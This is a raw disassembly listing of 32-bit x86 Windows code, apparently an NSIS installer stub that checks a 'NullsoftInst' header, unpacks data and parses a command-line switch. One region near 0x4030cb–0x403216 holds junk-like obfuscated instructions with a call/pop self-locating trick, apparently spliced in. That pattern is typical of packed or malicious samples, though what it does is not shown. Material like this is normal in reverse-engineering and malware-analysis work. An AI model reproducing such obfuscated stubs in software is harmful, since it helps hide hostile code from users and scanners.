  402bbb:	c2 10 00             	ret    $0x10
  402bbe:	56                   	push   %esi
  402bbf:	33 f6                	xor    %esi,%esi
  402bc1:	39 74 24 08          	cmp    %esi,0x8(%esp)
  402bc5:	74 18                	je     0x402bdf
  402bc7:	a1 20 70 41 00       	mov    0x417020,%eax
  402bcc:	3b c6                	cmp    %esi,%eax
  402bce:	74 07                	je     0x402bd7
  402bd0:	50                   	push   %eax
  402bd1:	ff 15 e8 71 40 00    	call   *0x4071e8
  402bd7:	89 35 20 70 41 00    	mov    %esi,0x417020
  402bdd:	5e                   	pop    %esi
  402bde:	c3                   	ret
  402bdf:	39 35 20 70 41 00    	cmp    %esi,0x417020
  402be5:	74 08                	je     0x402bef
  402be7:	56                   	push   %esi
  402be8:	e8 4b 31 00 00       	call   0x405d38
  402bed:	5e                   	pop    %esi
  402bee:	c3                   	ret
  402bef:	ff 15 8c 70 40 00    	call   *0x40708c
  402bf5:	3b 05 8c 3e 42 00    	cmp    0x423e8c,%eax
  402bfb:	76 23                	jbe    0x402c20
  402bfd:	56                   	push   %esi
  402bfe:	68 3b 2b 40 00       	push   $0x402b3b
  402c03:	56                   	push   %esi
  402c04:	6a 6f                	push   $0x6f
  402c06:	ff 35 80 3e 42 00    	push   0x423e80
  402c0c:	ff 15 ec 71 40 00    	call   *0x4071ec
  402c12:	6a 05                	push   $0x5
  402c14:	50                   	push   %eax
  402c15:	a3 20 70 41 00       	mov    %eax,0x417020
  402c1a:	ff 15 60 72 40 00    	call   *0x407260
  402c20:	5e                   	pop    %esi
  402c21:	c3                   	ret
  402c22:	55                   	push   %ebp
  402c23:	8b ec                	mov    %esp,%ebp
  402c25:	83 ec 28             	sub    $0x28,%esp
  402c28:	53                   	push   %ebx
  402c29:	56                   	push   %esi
  402c2a:	33 db                	xor    %ebx,%ebx
  402c2c:	57                   	push   %edi
  402c2d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402c30:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402c33:	ff 15 8c 70 40 00    	call   *0x40708c
  402c39:	be 00 ac 42 00       	mov    $0x42ac00,%esi
  402c3e:	68 00 04 00 00       	push   $0x400
  402c43:	05 e8 03 00 00       	add    $0x3e8,%eax
  402c48:	56                   	push   %esi
  402c49:	53                   	push   %ebx
  402c4a:	a3 8c 3e 42 00       	mov    %eax,0x423e8c
  402c4f:	ff 15 94 70 40 00    	call   *0x407094
  402c55:	6a 03                	push   $0x3
  402c57:	68 00 00 00 80       	push   $0x80000000
  402c5c:	56                   	push   %esi
  402c5d:	e8 52 2a 00 00       	call   0x4056b4
  402c62:	8b f8                	mov    %eax,%edi
  402c64:	83 ff ff             	cmp    $0xffffffff,%edi
  402c67:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402c6a:	89 3d 14 90 40 00    	mov    %edi,0x409014
  402c70:	75 0a                	jne    0x402c7c
  402c72:	b8 04 91 40 00       	mov    $0x409104,%eax
  402c77:	e9 d8 01 00 00       	jmp    0x402e54
  402c7c:	56                   	push   %esi
  402c7d:	be 00 9c 42 00       	mov    $0x429c00,%esi
  402c82:	56                   	push   %esi
  402c83:	e8 55 2d 00 00       	call   0x4059dd
  402c88:	56                   	push   %esi
  402c89:	e8 89 28 00 00       	call   0x405517
  402c8e:	50                   	push   %eax
  402c8f:	68 00 b0 42 00       	push   $0x42b000
  402c94:	e8 44 2d 00 00       	call   0x4059dd
  402c99:	53                   	push   %ebx
  402c9a:	57                   	push   %edi
  402c9b:	ff 15 90 70 40 00    	call   *0x407090
  402ca1:	3b c3                	cmp    %ebx,%eax
  402ca3:	a3 28 f0 41 00       	mov    %eax,0x41f028
  402ca8:	8b f0                	mov    %eax,%esi
  402caa:	0f 8e e7 00 00 00    	jle    0x402d97
  402cb0:	bb 28 70 41 00       	mov    $0x417028,%ebx
  402cb5:	a1 94 3e 42 00       	mov    0x423e94,%eax
  402cba:	8b fe                	mov    %esi,%edi
  402cbc:	f7 d8                	neg    %eax
  402cbe:	1b c0                	sbb    %eax,%eax
  402cc0:	25 00 7e 00 00       	and    $0x7e00,%eax
  402cc5:	05 00 02 00 00       	add    $0x200,%eax
  402cca:	3b f0                	cmp    %eax,%esi
  402ccc:	7c 02                	jl     0x402cd0
  402cce:	8b f8                	mov    %eax,%edi
  402cd0:	57                   	push   %edi
  402cd1:	53                   	push   %ebx
  402cd2:	e8 77 03 00 00       	call   0x40304e
  402cd7:	85 c0                	test   %eax,%eax
  402cd9:	0f 84 22 01 00 00    	je     0x402e01
  402cdf:	83 3d 94 3e 42 00 00 	cmpl   $0x0,0x423e94
  402ce6:	75 7a                	jne    0x402d62
  402ce8:	6a 1c                	push   $0x1c
  402cea:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402ced:	53                   	push   %ebx
  402cee:	50                   	push   %eax
  402cef:	e8 81 29 00 00       	call   0x405675
  402cf4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402cf7:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  402cfc:	75 72                	jne    0x402d70
  402cfe:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  402d05:	75 69                	jne    0x402d70
  402d07:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  402d0e:	75 60                	jne    0x402d70
  402d10:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  402d17:	75 57                	jne    0x402d70
  402d19:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  402d20:	75 4e                	jne    0x402d70
  402d22:	09 45 08             	or     %eax,0x8(%ebp)
  402d25:	8b 45 08             	mov    0x8(%ebp),%eax
  402d28:	8b 0d 18 b0 40 00    	mov    0x40b018,%ecx
  402d2e:	83 e0 02             	and    $0x2,%eax
  402d31:	09 05 20 3f 42 00    	or     %eax,0x423f20
  402d37:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402d3a:	3b c6                	cmp    %esi,%eax
  402d3c:	89 0d 94 3e 42 00    	mov    %ecx,0x423e94
  402d42:	0f 8f b2 00 00 00    	jg     0x402dfa
  402d48:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  402d4c:	75 06                	jne    0x402d54
  402d4e:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  402d52:	75 41                	jne    0x402d95
  402d54:	ff 45 fc             	incl   -0x4(%ebp)
  402d57:	8d 70 fc             	lea    -0x4(%eax),%esi
  402d5a:	3b fe                	cmp    %esi,%edi
  402d5c:	76 12                	jbe    0x402d70
  402d5e:	8b fe                	mov    %esi,%edi
  402d60:	eb 0e                	jmp    0x402d70
  402d62:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  402d66:	75 08                	jne    0x402d70
  402d68:	6a 00                	push   $0x0
  402d6a:	e8 4f fe ff ff       	call   0x402bbe
  402d6f:	59                   	pop    %ecx
  402d70:	3b 35 28 f0 41 00    	cmp    0x41f028,%esi
  402d76:	7d 0d                	jge    0x402d85
  402d78:	57                   	push   %edi
  402d79:	53                   	push   %ebx
  402d7a:	ff 75 f8             	push   -0x8(%ebp)
  402d7d:	e8 e9 2f 00 00       	call   0x405d6b
  402d82:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402d85:	01 3d 18 b0 40 00    	add    %edi,0x40b018
  402d8b:	2b f7                	sub    %edi,%esi
  402d8d:	85 f6                	test   %esi,%esi
  402d8f:	0f 8f 20 ff ff ff    	jg     0x402cb5
  402d95:	33 db                	xor    %ebx,%ebx
  402d97:	6a 01                	push   $0x1
  402d99:	e8 20 fe ff ff       	call   0x402bbe
  402d9e:	39 1d 94 3e 42 00    	cmp    %ebx,0x423e94
  402da4:	59                   	pop    %ecx
  402da5:	74 53                	je     0x402dfa
  402da7:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  402daa:	74 22                	je     0x402dce
  402dac:	ff 35 18 b0 40 00    	push   0x40b018
  402db2:	e8 c9 02 00 00       	call   0x403080
  402db7:	8d 45 08             	lea    0x8(%ebp),%eax
  402dba:	6a 04                	push   $0x4
  402dbc:	50                   	push   %eax
  402dbd:	e8 8c 02 00 00       	call   0x40304e
  402dc2:	85 c0                	test   %eax,%eax
  402dc4:	74 34                	je     0x402dfa
  402dc6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402dc9:	3b 45 08             	cmp    0x8(%ebp),%eax
  402dcc:	75 2c                	jne    0x402dfa
  402dce:	ff 75 ec             	push   -0x14(%ebp)
  402dd1:	6a 40                	push   $0x40
  402dd3:	ff 15 00 71 40 00    	call   *0x407100
  402dd9:	8b f0                	mov    %eax,%esi
  402ddb:	a1 94 3e 42 00       	mov    0x423e94,%eax
  402de0:	83 c0 1c             	add    $0x1c,%eax
  402de3:	50                   	push   %eax
  402de4:	e8 97 02 00 00       	call   0x403080
  402de9:	ff 75 ec             	push   -0x14(%ebp)
  402dec:	56                   	push   %esi
  402ded:	53                   	push   %ebx
  402dee:	6a ff                	push   $0xffffffff
  402df0:	e8 66 00 00 00       	call   0x402e5b
  402df5:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  402df8:	74 11                	je     0x402e0b
  402dfa:	b8 38 90 40 00       	mov    $0x409038,%eax
  402dff:	eb 53                	jmp    0x402e54
  402e01:	6a 01                	push   $0x1
  402e03:	e8 b6 fd ff ff       	call   0x402bbe
  402e08:	59                   	pop    %ecx
  402e09:	eb ef                	jmp    0x402dfa
  402e0b:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  402e0f:	89 35 90 3e 42 00    	mov    %esi,0x423e90
  402e15:	8b 06                	mov    (%esi),%eax
  402e17:	a3 98 3e 42 00       	mov    %eax,0x423e98
  402e1c:	74 06                	je     0x402e24
  402e1e:	ff 05 9c 3e 42 00    	incl   0x423e9c
  402e24:	6a 08                	push   $0x8
  402e26:	8d 46 44             	lea    0x44(%esi),%eax
  402e29:	59                   	pop    %ecx
  402e2a:	83 e8 08             	sub    $0x8,%eax
  402e2d:	01 30                	add    %esi,(%eax)
  402e2f:	49                   	dec    %ecx
  402e30:	75 f8                	jne    0x402e2a
  402e32:	6a 01                	push   $0x1
  402e34:	53                   	push   %ebx
  402e35:	53                   	push   %ebx
  402e36:	ff 75 f4             	push   -0xc(%ebp)
  402e39:	ff 15 34 71 40 00    	call   *0x407134
  402e3f:	89 46 3c             	mov    %eax,0x3c(%esi)
  402e42:	83 c6 04             	add    $0x4,%esi
  402e45:	6a 40                	push   $0x40
  402e47:	56                   	push   %esi
  402e48:	68 a0 3e 42 00       	push   $0x423ea0
  402e4d:	e8 23 28 00 00       	call   0x405675
  402e52:	33 c0                	xor    %eax,%eax
  402e54:	5f                   	pop    %edi
  402e55:	5e                   	pop    %esi
  402e56:	5b                   	pop    %ebx
  402e57:	c9                   	leave
  402e58:	c2 04 00             	ret    $0x4
  402e5b:	55                   	push   %ebp
  402e5c:	8b ec                	mov    %esp,%ebp
  402e5e:	83 ec 54             	sub    $0x54,%esp
  402e61:	53                   	push   %ebx
  402e62:	56                   	push   %esi
  402e63:	8b 75 14             	mov    0x14(%ebp),%esi
  402e66:	57                   	push   %edi
  402e67:	8b 7d 10             	mov    0x10(%ebp),%edi
  402e6a:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402e6d:	85 ff                	test   %edi,%edi
  402e6f:	75 07                	jne    0x402e78
  402e71:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  402e78:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402e7c:	8b df                	mov    %edi,%ebx
  402e7e:	85 ff                	test   %edi,%edi
  402e80:	75 05                	jne    0x402e87
  402e82:	bb 20 f0 40 00       	mov    $0x40f020,%ebx
  402e87:	8b 45 08             	mov    0x8(%ebp),%eax
  402e8a:	85 c0                	test   %eax,%eax
  402e8c:	7c 0e                	jl     0x402e9c
  402e8e:	8b 0d d8 3e 42 00    	mov    0x423ed8,%ecx
  402e94:	03 c8                	add    %eax,%ecx
  402e96:	51                   	push   %ecx
  402e97:	e8 e4 01 00 00       	call   0x403080
  402e9c:	8d 45 14             	lea    0x14(%ebp),%eax
  402e9f:	6a 04                	push   $0x4
  402ea1:	50                   	push   %eax
  402ea2:	e8 a7 01 00 00       	call   0x40304e
  402ea7:	85 c0                	test   %eax,%eax
  402ea9:	0f 84 4a 01 00 00    	je     0x402ff9
  402eaf:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  402eb3:	0f 84 29 01 00 00    	je     0x402fe2
  402eb9:	ff 15 8c 70 40 00    	call   *0x40708c
  402ebf:	b9 90 af 40 00       	mov    $0x40af90,%ecx
  402ec4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402ec7:	e8 0d 2f 00 00       	call   0x405dd9
  402ecc:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  402ed3:	8b 45 14             	mov    0x14(%ebp),%eax
  402ed6:	89 45 08             	mov    %eax,0x8(%ebp)
  402ed9:	0f 8e 65 01 00 00    	jle    0x403044
  402edf:	be 00 40 00 00       	mov    $0x4000,%esi
  402ee4:	39 75 14             	cmp    %esi,0x14(%ebp)
  402ee7:	7d 03                	jge    0x402eec
  402ee9:	8b 75 14             	mov    0x14(%ebp),%esi
  402eec:	bf 20 b0 40 00       	mov    $0x40b020,%edi
  402ef1:	56                   	push   %esi
  402ef2:	57                   	push   %edi
  402ef3:	e8 56 01 00 00       	call   0x40304e
  402ef8:	85 c0                	test   %eax,%eax
  402efa:	0f 84 f9 00 00 00    	je     0x402ff9
  402f00:	29 75 14             	sub    %esi,0x14(%ebp)
  402f03:	89 3d a8 af 40 00    	mov    %edi,0x40afa8
  402f09:	89 35 ac af 40 00    	mov    %esi,0x40afac
  402f0f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402f12:	b9 90 af 40 00       	mov    $0x40af90,%ecx
  402f17:	89 1d b0 af 40 00    	mov    %ebx,0x40afb0
  402f1d:	a3 b4 af 40 00       	mov    %eax,0x40afb4
  402f22:	e8 d2 2e 00 00       	call   0x405df9
  402f27:	85 c0                	test   %eax,%eax
  402f29:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402f2c:	0f 8c a8 00 00 00    	jl     0x402fda
  402f32:	8b 35 b0 af 40 00    	mov    0x40afb0,%esi
  402f38:	2b f3                	sub    %ebx,%esi
  402f3a:	ff 15 8c 70 40 00    	call   *0x40708c
  402f40:	f6 05 34 3f 42 00 01 	testb  $0x1,0x423f34
  402f47:	8b f8                	mov    %eax,%edi
  402f49:	74 43                	je     0x402f8e
  402f4b:	2b 45 f4             	sub    -0xc(%ebp),%eax
  402f4e:	3d c8 00 00 00       	cmp    $0xc8,%eax
  402f53:	77 06                	ja     0x402f5b
  402f55:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  402f59:	75 33                	jne    0x402f8e
  402f5b:	8b 45 08             	mov    0x8(%ebp),%eax
  402f5e:	ff 75 08             	push   0x8(%ebp)
  402f61:	2b 45 14             	sub    0x14(%ebp),%eax
  402f64:	6a 64                	push   $0x64
  402f66:	50                   	push   %eax
  402f67:	ff 15 30 71 40 00    	call   *0x407130
  402f6d:	50                   	push   %eax
  402f6e:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402f71:	68 20 91 40 00       	push   $0x409120
  402f76:	50                   	push   %eax
  402f77:	ff 15 00 72 40 00    	call   *0x407200
  402f7d:	83 c4 0c             	add    $0xc,%esp
  402f80:	8d 45 ac             	lea    -0x54(%ebp),%eax
  402f83:	50                   	push   %eax
  402f84:	6a 00                	push   $0x0
  402f86:	e8 f0 1d 00 00       	call   0x404d7b
  402f8b:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402f8e:	33 c0                	xor    %eax,%eax
  402f90:	3b f0                	cmp    %eax,%esi
  402f92:	74 3b                	je     0x402fcf
  402f94:	39 45 10             	cmp    %eax,0x10(%ebp)
  402f97:	75 1e                	jne    0x402fb7
  402f99:	50                   	push   %eax
  402f9a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402f9d:	50                   	push   %eax
  402f9e:	56                   	push   %esi
  402f9f:	53                   	push   %ebx
  402fa0:	ff 75 0c             	push   0xc(%ebp)
  402fa3:	ff 15 28 71 40 00    	call   *0x407128
  402fa9:	85 c0                	test   %eax,%eax
  402fab:	74 31                	je     0x402fde
  402fad:	39 75 f0             	cmp    %esi,-0x10(%ebp)
  402fb0:	75 2c                	jne    0x402fde
  402fb2:	01 75 fc             	add    %esi,-0x4(%ebp)
  402fb5:	eb 0c                	jmp    0x402fc3
  402fb7:	01 75 fc             	add    %esi,-0x4(%ebp)
  402fba:	29 75 f8             	sub    %esi,-0x8(%ebp)
  402fbd:	8b 1d b0 af 40 00    	mov    0x40afb0,%ebx
  402fc3:	83 7d ec 01          	cmpl   $0x1,-0x14(%ebp)
  402fc7:	0f 85 42 ff ff ff    	jne    0x402f0f
  402fcd:	eb 75                	jmp    0x403044
  402fcf:	39 45 14             	cmp    %eax,0x14(%ebp)
  402fd2:	0f 8f 07 ff ff ff    	jg     0x402edf
  402fd8:	eb 6a                	jmp    0x403044
  402fda:	6a fc                	push   $0xfffffffc
  402fdc:	eb 1d                	jmp    0x402ffb
  402fde:	6a fe                	push   $0xfffffffe
  402fe0:	eb 19                	jmp    0x402ffb
  402fe2:	85 ff                	test   %edi,%edi
  402fe4:	74 53                	je     0x403039
  402fe6:	39 75 14             	cmp    %esi,0x14(%ebp)
  402fe9:	7d 03                	jge    0x402fee
  402feb:	8b 75 14             	mov    0x14(%ebp),%esi
  402fee:	56                   	push   %esi
  402fef:	57                   	push   %edi
  402ff0:	e8 59 00 00 00       	call   0x40304e
  402ff5:	85 c0                	test   %eax,%eax
  402ff7:	75 48                	jne    0x403041
  402ff9:	6a fd                	push   $0xfffffffd
  402ffb:	58                   	pop    %eax
  402ffc:	eb 49                	jmp    0x403047
  402ffe:	8b 75 f8             	mov    -0x8(%ebp),%esi
  403001:	39 75 14             	cmp    %esi,0x14(%ebp)
  403004:	7d 03                	jge    0x403009
  403006:	8b 75 14             	mov    0x14(%ebp),%esi
  403009:	bf 20 b0 40 00       	mov    $0x40b020,%edi
  40300e:	56                   	push   %esi
  40300f:	57                   	push   %edi
  403010:	e8 39 00 00 00       	call   0x40304e
  403015:	85 c0                	test   %eax,%eax
  403017:	74 e0                	je     0x402ff9
  403019:	8d 45 10             	lea    0x10(%ebp),%eax
  40301c:	6a 00                	push   $0x0
  40301e:	50                   	push   %eax
  40301f:	56                   	push   %esi
  403020:	57                   	push   %edi
  403021:	ff 75 0c             	push   0xc(%ebp)
  403024:	ff 15 28 71 40 00    	call   *0x407128
  40302a:	85 c0                	test   %eax,%eax
  40302c:	74 b0                	je     0x402fde
  40302e:	3b 75 10             	cmp    0x10(%ebp),%esi
  403031:	75 ab                	jne    0x402fde
  403033:	01 75 fc             	add    %esi,-0x4(%ebp)
  403036:	29 75 14             	sub    %esi,0x14(%ebp)
  403039:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  40303d:	7f bf                	jg     0x402ffe
  40303f:	eb 03                	jmp    0x403044
  403041:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403044:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403047:	5f                   	pop    %edi
  403048:	5e                   	pop    %esi
  403049:	5b                   	pop    %ebx
  40304a:	c9                   	leave
  40304b:	c2 10 00             	ret    $0x10
  40304e:	55                   	push   %ebp
  40304f:	8b ec                	mov    %esp,%ebp
  403051:	56                   	push   %esi
  403052:	8b 75 0c             	mov    0xc(%ebp),%esi
  403055:	8d 45 0c             	lea    0xc(%ebp),%eax
  403058:	6a 00                	push   $0x0
  40305a:	50                   	push   %eax
  40305b:	56                   	push   %esi
  40305c:	ff 75 08             	push   0x8(%ebp)
  40305f:	ff 35 14 90 40 00    	push   0x409014
  403065:	ff 15 2c 71 40 00    	call   *0x40712c
  40306b:	85 c0                	test   %eax,%eax
  40306d:	74 0a                	je     0x403079
  40306f:	39 75 0c             	cmp    %esi,0xc(%ebp)
  403072:	75 05                	jne    0x403079
  403074:	33 c0                	xor    %eax,%eax
  403076:	40                   	inc    %eax
  403077:	eb 02                	jmp    0x40307b
  403079:	33 c0                	xor    %eax,%eax
  40307b:	5e                   	pop    %esi
  40307c:	5d                   	pop    %ebp
  40307d:	c2 08 00             	ret    $0x8
  403080:	6a 00                	push   $0x0
  403082:	6a 00                	push   $0x0
  403084:	ff 74 24 0c          	push   0xc(%esp)
  403088:	ff 35 14 90 40 00    	push   0x409014
  40308e:	ff 15 34 71 40 00    	call   *0x407134
  403094:	c2 04 00             	ret    $0x4
  403097:	56                   	push   %esi
  403098:	be 00 a4 42 00       	mov    $0x42a400,%esi
  40309d:	56                   	push   %esi
  40309e:	e8 9c 2b 00 00       	call   0x405c3f
  4030a3:	56                   	push   %esi
  4030a4:	e8 94 24 00 00       	call   0x40553d
  4030a9:	85 c0                	test   %eax,%eax
  4030ab:	75 02                	jne    0x4030af
  4030ad:	5e                   	pop    %esi
  4030ae:	c3                   	ret
  4030af:	56                   	push   %esi
  4030b0:	e8 1b 24 00 00       	call   0x4054d0
  4030b5:	6a 00                	push   $0x0
  4030b7:	56                   	push   %esi
  4030b8:	ff 15 80 70 40 00    	call   *0x407080
  4030be:	56                   	push   %esi
  4030bf:	68 00 a0 42 00       	push   $0x42a000
  4030c4:	e8 1a 26 00 00       	call   0x4056e3
  4030c9:	5e                   	pop    %esi
  4030ca:	c3                   	ret
  4030cb:	fe ca                	dec    %dl
  4030cd:	85 fb                	test   %edi,%ebx
  4030cf:	71 0e                	jno    0x4030df
  4030d1:	8d 15 47 ff 96 02    	lea    0x296ff47,%edx
  4030d7:	c7 c2 02 1a a4 f4    	mov    $0xf4a41a02,%edx
  4030dd:	1c 7f                	sbb    $0x7f,%al
  4030df:	87 db                	xchg   %ebx,%ebx
  4030e1:	34 89                	xor    $0x89,%al
  4030e3:	c6 c6 03             	mov    $0x3,%dh
  4030e6:	04 64                	add    $0x64,%al
  4030e8:	0f bf f3             	movswl %bx,%esi
  4030eb:	33 cf                	xor    %edi,%ecx
  4030ed:	80 d4 6c             	adc    $0x6c,%ah
  4030f0:	86 c0                	xchg   %al,%al
  4030f2:	85 f0                	test   %esi,%eax
  4030f4:	89 ed                	mov    %ebp,%ebp
  4030f6:	85 c6                	test   %eax,%esi
  4030f8:	ba 38 0a c8 ba       	mov    $0xbac80a38,%edx
  4030fd:	84 d9                	test   %bl,%cl
  4030ff:	b5 29                	mov    $0x29,%ch
  403101:	e8 22 00 00 00       	call   0x403128
  403106:	8d 0d f3 49 45 9f    	lea    0x9f4549f3,%ecx
  40310c:	2b f7                	sub    %edi,%esi
  40310e:	b1 25                	mov    $0x25,%cl
  403110:	69 f9 a3 62 18 c9    	imul   $0xc91862a3,%ecx,%edi
  403116:	f3 8d 3d 60 65 42 92 	repz lea 0x92426560,%edi
  40311d:	4d                   	dec    %ebp
  40311e:	81 f3 5c da 00 00    	xor    $0xda5c,%ebx
  403124:	89 d5                	mov    %edx,%ebp
  403126:	8b fa                	mov    %edx,%edi
  403128:	58                   	pop    %eax
  403129:	0f af ca             	imul   %edx,%ecx
  40312c:	8d 35 b2 4a 51 ff    	lea    0xff514ab2,%esi
  403132:	86 e9                	xchg   %ch,%cl
  403134:	0f b7 f7             	movzwl %di,%esi
  403137:	ff c3                	inc    %ebx
  403139:	f6 c2 55             	test   $0x55,%dl
  40313c:	85 d2                	test   %edx,%edx
  40313e:	8d 0d d0 9d ef e4    	lea    0xe4ef9dd0,%ecx
  403144:	49                   	dec    %ecx
  403145:	86 f5                	xchg   %dh,%ch
  403147:	0f af de             	imul   %esi,%ebx
  40314a:	c6 c3 c9             	mov    $0xc9,%bl
  40314d:	28 d1                	sub    %dl,%cl
  40314f:	c6 c2 80             	mov    $0x80,%dl
  403152:	33 d0                	xor    %eax,%edx
  403154:	c6 c5 65             	mov    $0x65,%ch
  403157:	4d                   	dec    %ebp
  403158:	81 d2 51 fb 08 81    	adc    $0x8108fb51,%edx
  40315e:	18 e2                	sbb    %ah,%dl
  403160:	68 99 c2 02 00       	push   $0x2c299
  403165:	8a ff                	mov    %bh,%bh
  403167:	59                   	pop    %ecx
  403168:	69 d6 e9 1e f2 85    	imul   $0x85f21ee9,%esi,%edx
  40316e:	8a f8                	mov    %al,%bh
  403170:	8b d7                	mov    %edi,%edx
  403172:	0f af dd             	imul   %ebp,%ebx
  403175:	0f b7 df             	movzwl %di,%ebx
  403178:	ff c5                	inc    %ebp
  40317a:	6b ff 00             	imul   $0x0,%edi,%edi
  40317d:	f3 69 d6 99 3c 38 2f 	repz imul $0x2f383c99,%esi,%edx
  403184:	fe c6                	inc    %dh
  403186:	8b f9                	mov    %ecx,%edi
  403188:	88 cb                	mov    %cl,%bl
  40318a:	81 fe b2 a5 04 45    	cmp    $0x4504a5b2,%esi
  403190:	b7 7c                	mov    $0x7c,%bh
  403192:	31 fe                	xor    %edi,%esi
  403194:	89 cd                	mov    %ecx,%ebp
  403196:	03 c7                	add    %edi,%eax
  403198:	1b d7                	sbb    %edi,%edx
  40319a:	87 ce                	xchg   %ecx,%esi
  40319c:	05 46 01 00 00       	add    $0x146,%eax
  4031a1:	ff cf                	dec    %edi
  4031a3:	81 e6 99 2f 44 64    	and    $0x64442f99,%esi
  4031a9:	80 df 9b             	sbb    $0x9b,%bh
  4031ac:	eb 0a                	jmp    0x4031b8
  4031ae:	b2 68                	mov    $0x68,%dl
  4031b0:	89 d3                	mov    %edx,%ebx
  4031b2:	81 cd d5 d4 41 ac    	or     $0xac41d4d5,%ebp
  4031b8:	33 f6                	xor    %esi,%esi
  4031ba:	85 ce                	test   %ecx,%esi
  4031bc:	75 02                	jne    0x4031c0
  4031be:	87 f9                	xchg   %edi,%ecx
  4031c0:	8a fd                	mov    %ch,%bh
  4031c2:	31 d2                	xor    %edx,%edx
  4031c4:	85 d6                	test   %edx,%esi
  4031c6:	81 c6 eb f4 ff ff    	add    $0xfffff4eb,%esi
  4031cc:	45                   	inc    %ebp
  4031cd:	81 c6 16 0b 00 00    	add    $0xb16,%esi
  4031d3:	87 ea                	xchg   %ebp,%edx
  4031d5:	f3 c7 c5 9f ad d4 0b 	repz mov $0xbd4ad9f,%ebp
  4031dc:	f2 47                	repnz inc %edi
  4031de:	81 fe 66 01 00 00    	cmp    $0x166,%esi
  4031e4:	0f 86 d0 ff ff ff    	jbe    0x4031ba
  4031ea:	03 d8                	add    %eax,%ebx
  4031ec:	0f b6 ff             	movzbl %bh,%edi
  4031ef:	89 e9                	mov    %ebp,%ecx
  4031f1:	fe c9                	dec    %cl
  4031f3:	0f be db             	movsbl %bl,%ebx
  4031f6:	8d 3d 8f cb a1 2d    	lea    0x2da1cb8f,%edi
  4031fc:	50                   	push   %eax
  4031fd:	70 03                	jo     0x403202
  4031ff:	f6 c5 e2             	test   $0xe2,%ch
  403202:	72 02                	jb     0x403206
  403204:	21 f2                	and    %esi,%edx
  403206:	c7 c3 0e da 4a 5b    	mov    $0x5b4ada0e,%ebx
  40320c:	33 f7                	xor    %edi,%esi
  40320e:	c6 c6 28             	mov    $0x28,%dh
  403211:	4a                   	dec    %edx
  403212:	8b f1                	mov    %ecx,%esi
  403214:	8a c8                	mov    %al,%cl
  403216:	c3                   	ret
  403217:	75 20                	jne    0x403239
  403219:	68 fb 03 00 00       	push   $0x3fb
  40321e:	55                   	push   %ebp
  40321f:	ff 15 a4 70 40 00    	call   *0x4070a4
  403225:	68 4c 91 40 00       	push   $0x40914c
  40322a:	55                   	push   %ebp
  40322b:	e8 c9 27 00 00       	call   0x4059f9
  403230:	e8 62 fe ff ff       	call   0x403097
  403235:	85 c0                	test   %eax,%eax
  403237:	74 7e                	je     0x4032b7
  403239:	68 00 a0 42 00       	push   $0x42a000
  40323e:	ff 15 44 71 40 00    	call   *0x407144
  403244:	56                   	push   %esi
  403245:	e8 d8 f9 ff ff       	call   0x402c22
  40324a:	3b c3                	cmp    %ebx,%eax
  40324c:	89 44 24 10          	mov    %eax,0x10(%esp)
  403250:	75 65                	jne    0x4032b7
  403252:	39 1d 9c 3e 42 00    	cmp    %ebx,0x423e9c
  403258:	74 4d                	je     0x4032a7
  40325a:	53                   	push   %ebx
  40325b:	57                   	push   %edi
  40325c:	e8 9a 22 00 00       	call   0x4054fb
  403261:	8b f0                	mov    %eax,%esi
  403263:	eb 09                	jmp    0x40326e
  403265:	81 3e 20 5f 3f 3d    	cmpl   $0x3d3f5f20,(%esi)
  40326b:	74 05                	je     0x403272
  40326d:	4e                   	dec    %esi
  40326e:	3b f7                	cmp    %edi,%esi
  403270:	73 f3                	jae    0x403265
  403272:	3b f7                	cmp    %edi,%esi
  403274:	c7 44 24 10 04 91 40 	movl   $0x409104,0x10(%esp)
  40327b:	00 
  40327c:	72 64                	jb     0x4032e2
  40327e:	88 1e                	mov    %bl,(%esi)
  403280:	83 c6 04             	add    $0x4,%esi
  403283:	56                   	push   %esi
  403284:	e8 28 23 00 00       	call   0x4055b1
  403289:	85 c0                	test   %eax,%eax
  40328b:	74 2a                	je     0x4032b7
  40328d:	56                   	push   %esi
  40328e:	68 00 94 42 00       	push   $0x429400
  403293:	e8 45 27 00 00       	call   0x4059dd
  403298:	56                   	push   %esi
  403299:	68 00 98 42 00       	push   $0x429800
  40329e:	e8 3a 27 00 00       	call   0x4059dd
  4032a3:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4032a7:	83 0d 2c 3f 42 00 ff 	orl    $0xffffffff,0x423f2c
  4032ae:	e8 73 02 00 00       	call   0x403526
  4032b3:	89 44 24 18          	mov    %eax,0x18(%esp)
  4032b7:	e8 90 01 00 00       	call   0x40344c
